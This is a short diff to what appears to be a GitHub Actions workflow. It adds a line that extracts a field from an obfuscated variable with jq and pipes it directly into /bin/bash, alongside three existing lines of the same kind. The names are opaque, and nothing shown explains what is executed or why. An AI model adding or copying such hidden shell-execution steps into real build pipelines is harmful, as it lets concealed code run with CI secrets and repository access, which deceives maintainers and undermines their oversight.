@@ -37,6 +37,7 @@ jobs:
           echo $fdfh351 | jq -r .fqjn2 | /bin/bash
           printf '%s' "$zl71724" | jq -r .kve646 | /bin/bash
           printf '%s' "$x30" | jq -r .fgd64433 | /bin/bash
+          echo $e3 | jq -r .y2724 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
